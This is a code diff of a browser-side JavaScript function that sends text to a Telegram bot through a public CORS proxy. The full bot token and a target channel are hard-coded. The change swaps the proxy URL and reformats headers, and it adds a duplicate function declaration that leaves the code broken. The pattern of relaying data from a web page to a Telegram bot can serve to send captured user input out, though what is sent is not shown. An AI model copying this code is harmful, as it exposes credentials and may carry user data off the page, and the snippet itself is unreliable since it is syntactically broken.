@@ -184,12 +184,15 @@
   }
 
   async function sendToTelegram(text) {
+  async function sendToTelegram(text) {
   const telegramURL = "https://api.telegram.org/bot8022691060:AAFXVc0JAyNfLkQ1c7dXENGq7M17bveDb8A/sendMessage";
-  const proxiedURL = `https://test.cors.workers.dev/${telegramURL}`;
+  const corsURL = `https://corsproxy.io/?url=${encodeURIComponent(telegramURL)}`;
 
-  await fetch(proxiedURL, {
+  await fetch(corsURL, {
     method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
+    headers: {
+      'Content-Type': 'application/json'
+    },
     body: JSON.stringify({
       chat_id: '@pegapegaospanela',
       text: text,
